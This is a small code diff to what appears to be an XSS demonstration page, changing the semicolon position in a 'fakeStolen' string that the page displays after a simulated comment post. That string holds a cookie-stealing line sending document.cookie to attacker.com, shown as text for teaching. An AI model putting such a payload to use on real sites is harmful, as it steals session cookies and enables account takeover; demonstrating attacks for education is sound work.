@@ -336,7 +336,7 @@ function postComment() {
     _xssSteps.posted = true;
     _xssSteps.triggered = true;
     setTimeout(() => {
-      const fakeStolen = `document.cookie = ";${document.cookie}"\nlocation.href = "https://attacker.com/steal?c=" + encodeURIComponent(document.cookie)`;
+      const fakeStolen = `document.cookie = "${document.cookie};"\nlocation.href = "https://attacker.com/steal?c=" + encodeURIComponent(document.cookie)`;
       document.getElementById('stolen-data').textContent = fakeStolen;
       document.getElementById('xss-overlay').classList.add('show');
     }, 300);
